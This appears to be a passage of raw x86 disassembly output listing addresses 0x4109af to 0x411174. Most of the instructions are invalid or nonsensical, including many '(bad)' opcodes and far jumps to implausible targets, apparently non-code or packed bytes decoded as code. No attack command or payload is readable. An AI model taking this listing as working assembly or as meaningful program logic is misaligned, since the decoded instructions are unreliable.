  4109af:	add    BYTE PTR [ebp-0x5e],al
  4109b2:	(bad)  
  4109b3:	and    eax,DWORD PTR [ecx-0x1a75b138]
  4109b9:	add    al,0x33
  4109bb:	jae    0x410a37
  4109bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109be:	mov    edi,0xfba43523
  4109c3:	mov    WORD PTR [ecx],fs
  4109c5:	dec    edi
  4109c6:	adc    dl,BYTE PTR [edx+0x0]
  4109c9:	add    BYTE PTR [eax],al
  4109cb:	add    BYTE PTR [eax],al
  4109cd:	es jne 0x4109c2
  4109d0:	push   ebp
  4109d1:	mov    edx,0x4553de7f
  4109d6:	adc    ch,dl
  4109d8:	dec    edi
  4109d9:	lock jmp 0x41098b
  4109dc:	add    ebp,esp
  4109de:	jg     0x4109be
  4109e0:	cmovae ebx,DWORD PTR [eax]
  4109e3:	cmovo  esp,DWORD PTR [esi+0x6b]
  4109e7:	add    cl,BYTE PTR [ebx-0x76ebf0cf]
  4109ed:	cmp    DWORD PTR [edi],eax
  4109ef:	or     al,0x3b
  4109f1:	mov    dh,0x28
  4109f3:	jle    0x410a74
  4109f5:	jne    0x410a22
  4109f7:	add    cl,BYTE PTR [ebx+0x23ce967d]
  4109fd:	sar    ebp,1
  4109ff:	js     0x410a54
  410a01:	xchg   ecx,eax
  410a02:	adc    edx,eax
  410a04:	imul   esi,DWORD PTR [ebx+eax*8+0x13],0xd22b7527
  410a0c:	(bad)  
  410a0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a0e:	sbb    edi,DWORD PTR [edi-0x41]
  410a11:	rcl    ah,0x82
  410a14:	jnp    0x410a6f
  410a16:	pop    ds
  410a17:	add    esi,DWORD PTR [ebp-0x3f]
  410a1a:	xchg   esp,eax
  410a1b:	mov    esi,0xfa946923
  410a20:	push   edx
  410a21:	(bad)  
  410a22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a23:	into   
  410a24:	and    ecx,DWORD PTR [ebp+0x5167d2fd]
  410a2a:	add    bl,ch
  410a2c:	ret    
  410a2d:	add    dl,cl
  410a2f:	pop    ebp
  410a30:	aam    0x0
  410a32:	add    BYTE PTR [eax],al
  410a34:	add    BYTE PTR [eax],al
  410a36:	push   0xffffff87
  410a38:	sub    BYTE PTR [eax-0x5896575d],dh
  410a3e:	xchg   esi,eax
  410a3f:	xchg   edx,eax
  410a40:	lock mov al,0x7e
  410a43:	lea    esp,[edi+ebx*8-0x50d6229e]
  410a4a:	data16 test al,0xef
  410a4d:	or     eax,DWORD PTR [ecx+0x11]
  410a50:	mov    ecx,0xe6367a
  410a55:	jnp    0x4109e1
  410a57:	test   DWORD PTR [eax],esp
  410a59:	es call 0xac8e:0xab26505c
  410a61:	fist   WORD PTR [edx]
  410a63:	mov    dl,0xfd
  410a65:	cvtps2pi mm6,xmm5
  410a68:	test   al,0x3
  410a6a:	inc    ch
  410a6c:	(bad)  
  410a6d:	out    dx,eax
  410a6e:	dec    DWORD PTR [ecx]
  410a70:	cmp    DWORD PTR ds:0xc0720a25,esp
  410a76:	push   esi
  410a77:	cli    
  410a78:	popa   
  410a79:	cld    
  410a7a:	ret    0x371f
  410a7d:	cld    
  410a7e:	test   esi,0x8377080c
  410a84:	and    al,0xe0
  410a86:	xchg   BYTE PTR [esi],al
  410a88:	mov    dh,0xb8
  410a8a:	xchg   esi,eax
  410a8b:	out    dx,al
  410a8c:	fnstsw WORD PTR [esi+0x40]
  410a8f:	and    DWORD PTR [ebp-0x3b690edb],esp
  410a95:	jmp    0x410ae9
  410a97:	mov    ecx,0x3cc
  410a9c:	add    BYTE PTR [eax],al
  410a9e:	add    BYTE PTR [ebp-0x73],dh
  410aa1:	adc    al,0xe0
  410aa3:	mov    ch,BYTE PTR [edx]
  410aa5:	shl    DWORD PTR [eax],1
  410aa7:	and    ah,BYTE PTR [eax]
  410aa9:	outs   dx,DWORD PTR ds:[esi]
  410aaa:	enter  0xea56,0xff
  410aae:	popa   
  410aaf:	mov    ebx,0x16c54348
  410ab4:	test   BYTE PTR [ecx-0x57],bh
  410ab7:	jbe    0x410ae3
  410ab9:	dec    ecx
  410aba:	cld    
  410abb:	ja     0x410abf
  410abd:	test   BYTE PTR [ecx],ch
  410abf:	and    eax,0xcaa58aec
  410ac4:	out    0x8a,eax
  410ac6:	icebp  
  410ac7:	imul   esi,DWORD PTR [ebx-0x303b26dd],0xfffffffe
  410ace:	cwde   
  410acf:	(bad)  
  410ad0:	xchg   BYTE PTR [edi-0x7d5a324c],bh
  410ad6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ad7:	mov    ds:0xeaeeff0f,al
  410adc:	pop    edi
  410add:	jmp    0xe529:0x835fa4eb
  410ae4:	pop    es
  410ae5:	(bad)  
  410ae6:	lods   eax,DWORD PTR ds:[esi]
  410ae7:	ret    0xef
  410aea:	jmp    0x7dce0d65
  410aef:	mov    dl,0xff
  410af1:	out    0xfa,eax
  410af3:	jb     0x410af6
  410af5:	add    BYTE PTR [edx-0x36],dh
  410af8:	jecxz  0x410b61
  410afa:	jmp    0xe332:0x625be3c2
  410b01:	dec    edi
  410b02:	pop    esp
  410b03:	add    BYTE PTR [eax],al
  410b05:	add    BYTE PTR [eax],al
  410b07:	add    BYTE PTR [edx],dh
  410b09:	add    cl,BYTE PTR [eax]
  410b0b:	jo     0x410b47
  410b0d:	jecxz  0x410b26
  410b0f:	lods   eax,DWORD PTR fs:[esi]
  410b11:	xchg   esi,eax
  410b12:	add    edi,edx
  410b14:	cdq    
  410b15:	sub    al,0x6b
  410b17:	bound  esi,QWORD PTR [ebp-0x66b5c8d9]
  410b1d:	and    BYTE PTR [edx+0x7320bba1],cl
  410b23:	lods   al,BYTE PTR ss:[esi]
  410b25:	ret    
  410b26:	and    ebx,ecx
  410b28:	lods   eax,DWORD PTR ds:[esi]
  410b29:	(bad)  
  410b2a:	cmp    eax,DWORD PTR [eax]
  410b2c:	inc    edx
  410b2d:	inc    ebx
  410b2e:	dec    BYTE PTR [eax+0x7c60353]
  410b34:	sbb    eax,0x6c244299
  410b39:	sahf   
  410b3a:	inc    ebp
  410b3b:	add    eax,0x5c225f86
  410b40:	test   BYTE PTR [esi+0x4],bl
  410b43:	mov    ah,BYTE PTR [eax]
  410b45:	aas    
  410b46:	data16 mov BYTE PTR [ebx],dl
  410b49:	push   ds
  410b4a:	or     eax,0x4e2013b6
  410b4f:	jmp    DWORD PTR [eax]
  410b51:	aas    
  410b52:	dec    edx
  410b53:	(bad)  
  410b54:	jmp    0x410b70
  410b56:	push   ecx
  410b57:	jmp    DWORD PTR [edx+0x16]
  410b5a:	mov    ah,0x47
  410b5c:	rol    DWORD PTR [ecx],1
  410b5e:	fmul   DWORD PTR [edi]
  410b60:	and    bl,BYTE PTR [esi+0x4]
  410b63:	push   eax
  410b64:	mov    ebp,DWORD PTR [edi+0x22]
  410b67:	fs out dx,eax
  410b69:	in     eax,0xd4
  410b6b:	sldt   WORD PTR [eax]
  410b6e:	add    BYTE PTR [eax],al
  410b70:	add    BYTE PTR [edx+0x5e],ah
  410b73:	add    eax,0x45ac8b50
  410b78:	push   es
  410b79:	mov    ebp,DWORD PTR [edi+0x22]
  410b7c:	jl     0x410b1d
  410b7e:	ror    DWORD PTR [esi-0x1],0xc2
  410b82:	mov    ds,WORD PTR [edx+0x24]
  410b85:	pop    eax
  410b86:	xchg   edx,eax
  410b88:	and    al,0xd9
  410b8a:	jp     0x410bae
  410b8c:	dec    eax
  410b8d:	xor    al,0x90
  410b8f:	mov    ch,0xff
  410b91:	cmp    esi,DWORD PTR [edx+esi*2+0x24]
  410b95:	sub    dh,0x7e
  410b98:	mov    bh,0xb
  410b9a:	loop   0x410b27
  410b9c:	je     0x410c0e
  410b9e:	data16 out 0x77,al
  410ba1:	mov    ds:0x918bfde1,eax
  410ba6:	push   cs
  410ba7:	mov    DWORD PTR [eax],ebx
  410ba9:	jne    0x410b4b
  410bab:	dec    edx
  410bac:	pop    esi
  410bad:	retf   
  410bae:	ror    BYTE PTR [esi+0x769c0e4],1
  410bb4:	add    dh,ch
  410bb6:	ror    DWORD PTR [edi],cl
  410bb8:	test   DWORD PTR [edi+ebx*1],edi
  410bbb:	or     cl,BYTE PTR [ebx+0x478b23bd]
  410bc1:	jno    0x410b73
  410bc3:	(bad)  
  410bc4:	mov    ah,BYTE PTR [ebp+0x67c9dd13]
  410bca:	add    edi,DWORD PTR [edx-0x70d89a76]
  410bd0:	adc    esp,DWORD PTR [edi+0x65]
  410bd3:	(bad)  
  410bd5:	add    BYTE PTR [eax],al
  410bd7:	add    BYTE PTR [eax],al
  410bd9:	add    BYTE PTR [esi+0x3f],ah
  410bdc:	test   al,0x8a
  410bde:	fs test al,0x44
  410be1:	add    esp,edi
  410be3:	arpl   WORD PTR [esi],cx
  410be5:	data16 clc 
  410be7:	fstp   DWORD PTR [eax-0xcddac0f]
  410bed:	je     0x410b6f
  410bef:	test   al,0x44
  410bf1:	add    esp,edi
  410bf3:	arpl   WORD PTR [esi],cx
  410bf5:	xor    esi,DWORD PTR [ebp+0x695f86e8]
  410bfb:	sub    ecx,DWORD PTR [ebp-0x47177ec1]
  410c01:	mov    bl,BYTE PTR [ecx+0x77032faa]
  410c07:	sub    eax,DWORD PTR [edx]
  410c09:	push   ebx
  410c0a:	and    edx,esp
  410c0c:	stos   DWORD PTR es:[edi],eax
  410c0d:	add    BYTE PTR [ebx+ebp*1+0x2],dh
  410c11:	(bad)  
  410c12:	lock dec esi
  410c14:	pop    ds
  410c15:	(bad)  
  410c16:	(bad)  
  410c17:	sti    
  410c18:	and    dh,BYTE PTR [ebp+ebp*2+0x5c]
  410c1c:	test   DWORD PTR [ebx],0x8b03eb69
  410c22:	sub    eax,0x8e7d3da6
  410c27:	add    bl,dl
  410c29:	and    al,BYTE PTR [edi-0x9a662ec]
  410c2f:	scas   al,BYTE PTR es:[edi]
  410c30:	sub    BYTE PTR [esi+edi*8],al
  410c33:	mov    ebp,DWORD PTR [eax-0x50]
  410c36:	bound  eax,QWORD PTR [edx]
  410c38:	je     0x410bc2
  410c3a:	push   ds
  410c3b:	pop    ds
  410c3c:	jge    0x410c60
  410c3e:	add    BYTE PTR [eax],al
  410c40:	add    BYTE PTR [eax],al
  410c42:	add    dl,al
  410c44:	mov    DWORD PTR [ecx+0x6d55c12b],ebp
  410c4a:	and    bh,cl
  410c4c:	inc    ecx
  410c4d:	fdivr  st(5),st
  410c4f:	test   DWORD PTR [ebx-0x14],0xa01bf7ca
  410c56:	xchg   ebp,eax
  410c57:	int    0xd0
  410c59:	sub    dl,al
  410c5b:	inc    eax
  410c5c:	mov    ecx,0x276452f
  410c61:	shl    BYTE PTR [edx],cl
  410c63:	jle    0x410c09
  410c65:	popa   
  410c66:	mov    dh,dl
  410c68:	scas   al,BYTE PTR es:[edi]
  410c69:	test   al,0x3
  410c6b:	into   
  410c6c:	cs mov ebx,0xc82ce8e
  410c72:	dec    edi
  410c73:	jnp    0x410c77
  410c75:	jmp    0x5ceb5033
  410c7a:	add    al,0x75
  410c7c:	add    bl,BYTE PTR [edx-0x29e96d5]
  410c82:	and    DWORD PTR [ebx+0x4af4ecf6],edx
  410c88:	add    ah,BYTE PTR [eax-0x3a]
  410c8b:	jbe    0x410c0e
  410c8d:	loopne 0x410cb0
  410c8f:	add    DWORD PTR ds:0xc45d441b,eax
  410c95:	jmp    0xf1ba:0xd6cf7503
  410c9c:	lds    ebp,FWORD PTR [esp+esi*4-0x2e]
  410ca0:	icebp  
  410ca1:	pop    edi
  410ca2:	mov    esi,?
  410ca4:	sub    bh,bh
  410ca6:	daa    
  410ca7:	add    BYTE PTR [eax],al
  410ca9:	add    BYTE PTR [eax],al
  410cab:	add    dh,ch
  410cad:	sbb    edi,esi
  410caf:	pop    esp
  410cb0:	cmp    al,BYTE PTR [eax+0x4c42a64f]
  410cb6:	adc    ch,BYTE PTR [ecx]
  410cb8:	jns    0x410c43
  410cba:	inc    edx
  410cbb:	loope  0x410d06
  410cbd:	inc    esi
  410cbe:	jae    0x410c76
  410cc0:	rol    DWORD PTR [edx],cl
  410cc2:	lea    ebp,[ebp*8-0x70249835]
  410cc9:	add    DWORD PTR [ebx-0x64ee7f],0xffffffe8
  410cd0:	xrelease mov BYTE PTR [ebx+0xa9bcb9],0x9e
  410cd8:	imul   ecx,DWORD PTR [esi+0x42],0x141d2de9
  410cdf:	dec    ebp
  410ce0:	jmp    0xb0b10cc0
  410ce5:	pop    es
  410ce6:	cmp    esp,DWORD PTR [edi]
  410ce8:	in     eax,dx
  410ce9:	outs   dx,BYTE PTR ds:[esi]
  410cea:	imul   ebp,eax,0x9983c6fb
  410cf0:	push   cs
  410cf1:	loop   0x410d1a
  410cf3:	mov    eax,ds:0xa1f523be
  410cf8:	jbe    0x410cfc
  410cfa:	lea    ebp,[edx+esi*8+0x55b655cb]
  410d01:	mul    BYTE PTR [ebx-0x78e44925]
  410d07:	stos   BYTE PTR es:[edi],al
  410d08:	mov    bl,al
  410d0a:	lds    edi,FWORD PTR [ebp-0x8]
  410d0d:	test   eax,0x5c00
  410d12:	add    BYTE PTR [eax],al
  410d14:	add    BYTE PTR [edx-0x6caeb081],bh
  410d1a:	popa   
  410d1b:	ja     0x410c9e
  410d1d:	sahf   
  410d1e:	xor    BYTE PTR [edi-0x17],dh
  410d21:	jbe    0x410cb0
  410d23:	inc    esp
  410d24:	gs mov es:0xcfbd0027,eax
  410d2b:	add    DWORD PTR [esi-0x5a],edx
  410d2e:	or     dl,BYTE PTR [edi+0x56]
  410d31:	add    edx,DWORD PTR [esi+esi*8]
  410d34:	adc    BYTE PTR [esi+eax*1-0x36a8fc77],cl
  410d3b:	or     eax,0xfde17084
  410d40:	jmp    FWORD PTR [edx+0x58]
  410d43:	push   esp
  410d44:	push   0xe
  410d46:	dec    edi
  410d47:	std    
  410d48:	adc    eax,0x3e1510
  410d4d:	aaa    
  410d4e:	leave  
  410d4f:	or     eax,0xfde15484
  410d54:	call   DWORD PTR [ebp+0x64050e46]
  410d5a:	(bad)  
  410d5b:	(bad)  
  410d5c:	jmp    FWORD PTR [edx]
  410d5e:	mov    BYTE PTR [ecx+0x18],al
  410d61:	call   0x3a14:0x3300f944
  410d68:	adc    eax,0x4588ff0c
  410d6d:	mov    BYTE PTR [esi],bh
  410d6f:	les    ecx,FWORD PTR [edi]
  410d71:	pop    eax
  410d72:	jne    0x410d73
  410d74:	dec    esp
  410d76:	lea    edi,[ebx]
  410d78:	mov    al,0x0
  410d7a:	add    BYTE PTR [eax],al
  410d7c:	add    BYTE PTR [eax],al
  410d7e:	mov    esp,0xa469fe3e
  410d83:	dec    esi
  410d84:	xchg   DWORD PTR [ebx-0x48],esi
  410d87:	xchg   DWORD PTR [ecx+0x28],esi
  410d8a:	jae    0x410d66
  410d8c:	push   0xf274730a
  410d91:	mov    edi,ebx
  410d93:	sub    bh,ch
  410d95:	xlat   BYTE PTR ds:[ebx]
  410d96:	pop    ss
  410d97:	dec    esi
  410d98:	sub    dl,BYTE PTR [eax-0x23]
  410d9b:	loope  0x410e10
  410d9d:	hlt    
  410d9e:	add    eax,0x69ff2e3f
  410da3:	out    0xe,al
  410da5:	inc    eax
  410da6:	jne    0x410dd3
  410da8:	fld    st(5)
  410daa:	jmp    0xc396bfbd
  410daf:	mov    es,edx
  410db1:	pop    ds
  410db2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410db3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410db4:	enter  0xa5ef,0x50
  410db8:	cwde   
  410db9:	repz dec ebp
  410dbb:	shl    BYTE PTR [edi+edi*8],1
  410dbe:	cmp    dh,BYTE PTR [ebp+0x1]
  410dc1:	xor    esi,DWORD PTR ds:0xfcf39879
  410dc7:	in     al,dx
  410dc8:	call   DWORD PTR [ebp+0x22]
  410dcb:	pslld  mm2,QWORD PTR [esi*4+0x7172db2b]
  410dd3:	sub    BYTE PTR [esi+0x22b7414],al
  410dd9:	mov    esi,DWORD PTR [eax-0x4b755a65]
  410ddf:	adc    DWORD PTR [eax+eax*8+0x0],esp
  410de6:	add    ch,bl
  410de8:	sub    al,0x8a
  410dea:	inc    edx
  410deb:	lods   eax,DWORD PTR ds:[esi]
  410dec:	and    BYTE PTR [edi+edi*4+0x72],dl
  410df0:	cwde   
  410df1:	ret    0xec2b
  410df4:	ins    BYTE PTR es:[edi],dx
  410df5:	(bad)  
  410df6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410df7:	jbe    0x410e48
  410df9:	add    al,0x83
  410dfb:	aad    0xcf
  410dfd:	cmp    BYTE PTR [edi+0x428b7a79],0x81
  410e04:	rep ins BYTE PTR es:[edi],dx
  410e06:	lahf   
  410e07:	mov    dl,0xf8
  410e09:	cmp    DWORD PTR [ebp+edi*2+0x2a],0x44
  410e0e:	inc    esp
  410e0f:	sahf   
  410e10:	sub    cl,BYTE PTR ds:0x22bb985
  410e16:	add    BYTE PTR [eax],al
  410e18:	xlat   BYTE PTR ds:[ebx]
  410e19:	xlat   BYTE PTR ds:[ebx]
  410e1a:	test   DWORD PTR [edx+0x7e444410],0xfff12a2b
  410e24:	add    ecx,ebp
  410e26:	add    ebx,edi
  410e28:	repnz push eax
  410e2a:	xor    al,0x45
  410e2c:	(bad)
  410e2f:	mov    bh,0xd6
  410e31:	cmp    BYTE PTR [edx+eiz*1],ch
  410e34:	(bad)  
  410e35:	lds    ebx,FWORD PTR [esi]
  410e37:	add    DWORD PTR [edi+0x56],ecx
  410e3a:	and    BYTE PTR [ebx+0x19],cl
  410e3d:	shr    ah,0xa6
  410e40:	add    ch,cl
  410e42:	mov    bh,BYTE PTR [edx+0x7503e720]
  410e48:	mov    ebp,DWORD PTR [ecx]
  410e4a:	rol    BYTE PTR [eax],1
  410e4c:	add    BYTE PTR [eax],al
  410e4e:	add    BYTE PTR [eax],al
  410e50:	in     eax,dx
  410e51:	daa    
  410e52:	out    0x3,eax
  410e54:	jne    0x410de3
  410e56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e57:	inc    ebp
  410e58:	sbb    bl,BYTE PTR [ecx]
  410e5a:	sub    ch,cl
  410e5c:	mov    DWORD PTR [ebx],ebx
  410e5e:	adc    BYTE PTR [edx],al
  410e60:	je     0x410e64
  410e62:	jmp    0x6d3c07f7
  410e67:	push   ds
  410e68:	sti    
  410e69:	mov    cl,0x73
  410e6b:	ret    0xb242
  410e6e:	push   eax
  410e6f:	test   BYTE PTR [edx],cl
  410e71:	sbb    DWORD PTR [ebp-0x57],edx
  410e74:	jne    0x410dfd
  410e76:	mov    ds:0xaaa2a87,eax
  410e7b:	push   ebp
  410e7c:	jmp    0xe902:0x438750f9
  410e83:	nop
  410e84:	cmp    DWORD PTR [esi-0x68],edi
  410e87:	sar    BYTE PTR [ebx-0x3e8c6f50],cl
  410e8d:	(bad)  
  410e8e:	call   0xfa9f8fb1
  410e93:	ret    
  410e94:	mov    ds:0x75a36989,al
  410e99:	add    ch,cl
  410e9b:	fidivr DWORD PTR [ebx-0x74f59af8]
  410ea1:	sbb    bh,bh
  410ea3:	cmc    
  410ea4:	enter  0x1417,0xad
  410ea8:	jge    0x410e82
  410eaa:	push   DWORD PTR [ecx-0x77]
  410ead:	fdivr  st(6),st
  410eaf:	push   ebp
  410eb0:	ds scas al,BYTE PTR es:[edi]
  410eb2:	(bad)  
  410eb3:	cld    
  410eb4:	add    BYTE PTR [eax],al
  410eb6:	add    BYTE PTR [eax],al
  410eb8:	add    BYTE PTR [edx-0x1016bff9],bl
  410ebe:	test   BYTE PTR [ebx-0x18],dl
  410ec1:	jbe    0x410ec5
  410ec3:	cmp    esp,DWORD PTR [esi-0x17961813]
  410ec9:	or     al,0x3
  410ecb:	push   esi
  410ecc:	scas   al,BYTE PTR es:[edi]
  410ecd:	inc    edx
  410ece:	cmp    BYTE PTR [edi],cl
  410ed0:	sub    DWORD PTR [ecx-0x77],edi
  410ed3:	cmp    BYTE PTR ds:0xd2000276,0xb9
  410eda:	xchg   ebx,eax
  410edb:	sbb    bh,BYTE PTR [ecx]
  410edd:	js     0x410f33
  410edf:	push   ebx
  410ee0:	call   0xd540115b
  410ee5:	dec    esi
  410ee6:	pop    es
  410ee7:	inc    eax
  410ee8:	jmp    0xe89893dc
  410eed:	jbe    0x410ef1
  410eef:	cmp    ebp,DWORD PTR [esi]
  410ef1:	or     eax,0x8da4c604
  410ef6:	add    dl,BYTE PTR [esi-0x42]
  410ef9:	sub    esi,0x17b6f40f
  410eff:	mov    BYTE PTR [ebp+ebp*2+0x37305db8],ch
  410f06:	add    eax,DWORD PTR [eax]
  410f08:	call   0x17b6:0xd9bbf6ed
  410f0f:	push   esp
  410f10:	jb     0x410e9b
  410f12:	mov    WORD PTR [ebp-0x3],es
  410f15:	loope  0x410f95
  410f17:	mov    edi,0xfeb2759d
  410f1c:	cmp    al,BYTE PTR [eax]
  410f1e:	add    BYTE PTR [eax],al
  410f20:	add    BYTE PTR [eax],al
  410f22:	in     al,dx
  410f23:	mov    ebp,0x3707000b
  410f28:	or     dl,BYTE PTR [ebx]
  410f2a:	fadd   QWORD PTR [ebx]
  410f2c:	test   eax,eax
  410f2e:	add    BYTE PTR [edx],al
  410f30:	push   eax
  410f31:	jmp    DWORD PTR [ebx-0x77]
  410f34:	inc    esp
  410f35:	add    al,0xdf
  410f37:	sti    
  410f38:	std    
  410f39:	je     0x410f8e
  410f3b:	push   ebx
  410f3c:	std    
  410f3d:	adc    eax,0x3e1454
  410f42:	xlat   BYTE PTR ds:[ebx]
  410f43:	cmp    eax,0x6f1c8512
  410f48:	add    DWORD PTR [eax+0xb],edx
  410f4b:	into   
  410f4c:	mov    DWORD PTR [esi+0x1c],eax
  410f4f:	cmp    BYTE PTR [esi-0x2acac8c],0x15
  410f56:	test   al,0x14
  410f58:	add    BYTE PTR ds:[edi-0x7f3f7b03],ah
  410f5f:	add    DWORD PTR [eax-0x1],edx
  410f62:	jecxz  0x410ee6
  410f64:	jp     0x410f8a
  410f66:	sub    al,0x3
  410f68:	je     0x410fe3
  410f6a:	xchg   DWORD PTR [ebp+0x56],edi
  410f6d:	add    DWORD PTR [ebx+eax*1],ecx
  410f70:	test   eax,eax
  410f72:	add    BYTE PTR [eax],cl
  410f74:	push   eax
  410f75:	call   DWORD PTR [edx]
  410f77:	dec    edi
  410f78:	(bad)  
  410f79:	(bad)  
  410f7a:	fdivr  st(5),st
  410f7c:	adc    ebx,eax
  410f7e:	fadd   QWORD PTR [edx-0x2]
  410f81:	mov    dl,BYTE PTR [edx+0x57]
  410f84:	(bad)  
  410f85:	inc    DWORD PTR [eax]
  410f87:	add    BYTE PTR [eax],al
  410f89:	add    BYTE PTR [eax],al
  410f8b:	fdivr  QWORD PTR [edi-0x42]
  410f8e:	je     0x410f6f
  410f90:	push   edx
  410f91:	std    
  410f92:	rcl    DWORD PTR [edi+0x7d],cl
  410f95:	push   edx
  410f96:	add    esp,ecx
  410f98:	add    al,BYTE PTR [ebp+0x4ffe10c0]
  410f9e:	jmp    DWORD PTR [ecx+0x75400ece]
  410fa4:	sub    DWORD PTR [edi+0x22a1585],eax
  410faa:	add    al,bh
  410fac:	call   0x18661247
  410fb1:	xor    cl,BYTE PTR [edx+0x1a8fb]
  410fb7:	jne    0x410f57
  410fb9:	inc    edx
  410fba:	jae    0x410f53
  410fbc:	mov    cl,0x3
  410fbe:	push   eax
  410fbf:	push   0xf
  410fc1:	loop   0x410fd5
  410fc3:	mov    ch,0x2b
  410fc5:	xlat   BYTE PTR ds:[ebx]
  410fc6:	add    DWORD PTR [ebx+ebp*1+0x2],esi
  410fca:	je     0x411033
  410fcc:	mov    cl,0x3
  410fce:	push   0x75
  410fd0:	mov    cl,0xf5
  410fd2:	dec    BYTE PTR [ebx]
  410fd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410fd5:	add    al,0x0
  410fd7:	jne    0x41103d
  410fd9:	lock xlat BYTE PTR ds:[ebx]
  410fdb:	mov    ebx,ebp
  410fdd:	add    eax,DWORD PTR [ecx+0x4f833]
  410fe3:	jne    0x410f68
  410fe5:	stos   DWORD PTR es:[edi],eax
  410fe6:	(bad)  [ebp+0x2b]
  410fe9:	mov    ecx,0xff69ae5d
  410fee:	inc    DWORD PTR [eax]
  410ff0:	add    BYTE PTR [eax],al
  410ff2:	add    BYTE PTR [eax],al
  410ff4:	(bad)  
  410ff5:	shl    bl,cl
  410ff7:	mov    ecx,0x22bf5
  410ffc:	icebp  
  410ffd:	imul   ecx,DWORD PTR [edi-0x21e00a8c],0x3
  411004:	jne    0x41105e
  411006:	or     DWORD PTR [esi+esi*4+0x6aca1855],edx
  41100d:	ins    DWORD PTR es:[edi],dx
  41100e:	adc    esp,DWORD PTR [ecx]
  411010:	scas   eax,DWORD PTR es:[edi]
  411011:	xchg   ebx,eax
  411012:	test   DWORD PTR ds:0x9fd6602b,0xa0d67047
  41101c:	inc    ebx
  41101d:	and    eax,0x22ba2d6
  411022:	push   es
  411023:	fcom   st(1)
  411025:	lea    ebp,[ebp-0x17a0fa81]
  41102b:	add    esi,DWORD PTR [ebp-0x71]
  41102e:	fdivr  QWORD PTR [edi-0x1b]
  411031:	pop    edi
  411032:	call   0xe4d0853a
  411037:	(bad)  
  411038:	ret    0xea29
  41103b:	mov    ?,WORD PTR [edx+ecx*4-0x31a00a59]
  411042:	ins    BYTE PTR es:[edi],dx
  411043:	je     0x411059
  411045:	add    ch,cl
  411047:	add    ebp,eax
  411049:	push   es
  41104a:	ins    DWORD PTR es:[edi],dx
  41104b:	je     0x411064
  41104d:	add    ch,cl
  41104f:	add    ecx,eax
  411051:	(bad)  
  411052:	stc    
  411053:	inc    ebx
  411054:	pop    edi
  411055:	add    BYTE PTR [edx+0x45],dh
  411058:	add    BYTE PTR [eax],al
  41105a:	add    BYTE PTR [eax],al
  41105c:	add    dl,bh
  41105e:	ret    0x2ed7
  411061:	pop    ebp
  411062:	jle    0x4110bb
  411064:	arpl   WORD PTR [edx],si
  411066:	adc    eax,0x7e7e90e8
  41106b:	ja     0x4110d1
  41106d:	and    dl,BYTE PTR ds:0xd17690e8
  411073:	test   al,0x2e
  411075:	je     0x411000
  411077:	stos   BYTE PTR es:[edi],al
  411078:	mov    esi,DWORD PTR [ebp-0x9bc460e]
  41107e:	mov    dl,0xe7
  411080:	(bad)  
  411081:	jne    0x411045
  411083:	fs mov ah,0x74
  411086:	mov    gs,ecx
  411088:	xchg   BYTE PTR [edx+0x76b464ff],dh
  41108e:	mov    gs,ecx
  411090:	xchg   BYTE PTR [edx-0x7d4b9b0f],dh
  411096:	mov    gs,ecx
  411098:	xchg   BYTE PTR [edx+0x65b464fd],dh
  41109e:	mov    ?,edi
  4110a0:	jmp    0x2b484d98
  4110a5:	mov    dl,0x14
  4110a7:	push   ebx
  4110a8:	jb     0x4110fc
  4110aa:	and    bl,0x21
  4110ad:	stc    
  4110ae:	sub    bl,dl
  4110b0:	jmp    0xe94132b
  4110b5:	test   DWORD PTR [edi+ecx*1],edx
  4110b8:	test   eax,0xd4feb276
  4110bd:	push   edx
  4110be:	lock aas 
  4110c0:	jmp    0x4110c5
  4110c5:	add    ch,dh
  4110c7:	push   esp
  4110c8:	jae    0x41104e
  4110ca:	std    
  4110cb:	(bad)  
  4110cc:	and    ebp,ebp
  4110ce:	daa    
  4110cf:	stos   BYTE PTR es:[edi],al
  4110d0:	arpl   WORD PTR [ebp+ebp*1-0x20],bp
  4110d4:	ja     0x41110e
  4110d6:	or     eax,DWORD PTR [edx]
  4110d8:	push   eax
  4110d9:	into   
  4110da:	bound  ebx,QWORD PTR [ebx+edx*1]
  4110dd:	sub    DWORD PTR [ecx+0x7d],esi
  4110e0:	mov    edi,0x7b812d35
  4110e5:	or     eax,0x2474c475
  4110ea:	jecxz  0x4110ff
  4110ec:	mov    ebp,DWORD PTR ds:0x11500815
  4110f2:	cli    
  4110f3:	retf   0xc036
  4110f6:	dec    esi
  4110f7:	in     al,0x74
  4110f9:	jmp    0x748cb974
  4110fe:	xor    eax,0x2d6c0be0
  411103:	loopne 0x411178
  411105:	add    DWORD PTR [edi+0x726efe75],0x21087453
  41110f:	pop    ecx
  411110:	inc    edi
  411111:	xor    bh,BYTE PTR [eax+0x787de613]
  411117:	adc    al,0xfe
  411119:	cmp    DWORD PTR gs:[edi-0x4a0fff8],ecx
  411120:	push   edi
  411121:	int    0xf
  411123:	add    BYTE PTR [ebx+ebp*8],al
  411126:	aad    0x65
  411128:	dec    BYTE PTR [edx+0x0]
  41112e:	add    BYTE PTR [edi-0x1a],bl
  411131:	hlt    
  411132:	std    
  411133:	push   ebx
  411134:	stc    
  411135:	pop    ecx
  411136:	mov    edi,DWORD PTR [ecx+0x4b]
  411139:	rol    edx,0x88
  41113c:	dec    DWORD PTR [edx-0x3aec47bc]
  411142:	add    dl,BYTE PTR [eax+0x72]
  411145:	add    BYTE PTR ds:[edi],al
  411148:	dec    edi
  411149:	sub    ch,BYTE PTR [ebx]
  41114b:	fnsave [ebx]
  41114d:	xchg   DWORD PTR [eax],edx
  41114f:	xlat   BYTE PTR ds:[ebx]
  411150:	dec    edi
  411151:	sub    ebp,DWORD PTR cs:[ebp+0x58508726]
  411158:	xchg   BYTE PTR [edi+0x54],bh
  41115b:	dec    ebp
  41115c:	(bad)  
  41115d:	inc    ecx
  41115f:	pop    eax
  411160:	call   DWORD PTR [ebx+ecx*4+0x20]
  411164:	jle    0x411150
  411166:	pop    eax
  411167:	mov    eax,0x64f04d8b
  41116d:	push   cs
  41116e:	mov    DWORD PTR [ecx+0x38508bfa],edx
  411174:	dec    ebp
